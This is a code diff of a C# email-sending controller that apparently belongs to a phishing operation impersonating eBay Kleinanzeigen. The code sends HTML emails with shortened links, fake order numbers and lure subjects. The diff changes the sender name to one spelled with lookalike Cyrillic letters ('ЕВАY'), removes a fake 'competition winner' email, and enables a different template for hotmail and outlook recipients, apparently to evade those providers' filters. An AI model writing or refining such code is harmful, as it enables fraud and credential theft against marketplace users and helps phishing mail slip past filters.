@@ -22,7 +22,7 @@ public class SenderController : ControllerBase
 	{
 		_configuration = configuration;
 		_shortLinkService = shortLinkService;
-		_orderNumber = Random.Shared.Next(234422000, 234522847);
+		_orderNumber = Random.Shared.Next(234422000, 534522847);
 
 		var config = new EmailSendingConfiguration();
 
@@ -69,16 +69,9 @@ public class SenderController : ControllerBase
 	{
 		var body = await GetBody(link, ServiceType.EbayDe, email);
 		
-		var displayName = "•ebay◦kleinanzeigen◦de  ®";
+		var displayName = "•ЕВАY◦Kleinanzeigen◦Info®";
 
-		var subject = "Neuer Kunde! Danke, dass Sie sich für uns entschieden haben. #312887";
-
-		/*if (email.Contains("icloud"))
-		{
-			displayName = "•ebay-kleinanzeigen-de©";
-
-			subject = $"#{_orderNumber} Nutzer-Anfrage zu deiner Anzeige.";
-		}*/
+		var subject = $"Nutzer-Anfrage zu deiner Anzeige!#{_orderNumber}";
 
 		var message = new MailMessage(_senderEmail, email, subject, body)
 		{
@@ -98,41 +91,18 @@ public class SenderController : ControllerBase
 		}
 	}
 
-	[HttpGet("ebay-congrats")]
-	public async Task<IActionResult> SendEbayCongratsEmail(string email, string link)
-	{
-		var body = await GetBody(link, ServiceType.EbayCongrats, email);
-
-		var message = new MailMessage(_senderEmail, email, "Herzlichen Glückwunsch zum Gewinn des Wettbewerbs!", body)
-		{
-			IsBodyHtml = true,
-			From = new MailAddress(_senderEmail, "•EBAY•Kleinanzeigen")
-		};
-
-		try
-		{
-			await _smtpClient.SendMailAsync(message);
-
-			return Ok();
-		}
-		catch (Exception e)
-		{
-			return BadRequest(e.Message);
-		}
-	}
-
 	private async Task<string> GetBody(string link, ServiceType serviceType,
 		string email)
 	{
 		var template = EbayTemplate.Custom;
 
-		/*var listEmails = new List<string>
+		var listEmails = new List<string>
 		{
-			"hotmail", "outlook",  "icloud"
+			"hotmail", "outlook"
 		};
 		
 		if (listEmails.Any(email.Contains) && serviceType == ServiceType.EbayDe)
-			template = EbayTemplate.Original;*/
+			template = EbayTemplate.Original;
 		
 		var shortLink = await _shortLinkService.GetShortLink(link, template);
 
@@ -144,7 +114,6 @@ public class SenderController : ControllerBase
 							.Replace("PutYourLinkHere", shortLink);
 
 		return hmtlBody
-				.Replace("OrderNumber", _orderNumber.ToString())
-				.Replace("DateNow", DateTime.Now.ToString("dd-MM-yyyy"));
+				.Replace("OrderNumber", _orderNumber.ToString());
 	}
 }
